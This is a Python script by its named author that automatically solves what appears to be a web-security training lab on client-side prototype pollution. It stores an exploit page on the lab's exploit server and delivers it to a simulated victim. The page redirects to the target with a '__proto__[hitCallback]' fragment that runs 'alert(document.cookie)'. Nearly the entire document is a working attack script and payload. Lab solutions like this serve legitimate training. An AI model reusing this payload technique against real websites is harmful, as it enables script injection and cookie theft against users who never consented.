import requests
import re
import time
import sys


class LabSolver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()
        self.exploit_server_url = None

    def get_exploit_server_url(self):
        response = self.session.get(self.lab_url)
        self.exploit_server_url = re.search(r'(https://exploit-.*?)\'', response.text).group(1)

    def upload_payload_and_deliver_to_victim(self):
        data = {
            'urlIsHttps': 'on',
            'responseFile': '/exploit',
            'responseHead': 'HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8',
            'responseBody': '<script>location="{}#__proto__[hitCallback]=alert%28document.cookie%29"</script>'.format(self.lab_url),
            'formAction': 'STORE'
        }
        self.session.post(self.exploit_server_url, data=data)
        self.session.get(self.exploit_server_url + '/deliver-to-victim')

    def check_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.get_exploit_server_url()
        self.upload_payload_and_deliver_to_victim()
        time.sleep(30)
        self.check_solution()


solver = LabSolver(sys.argv[1])
solver.solve()
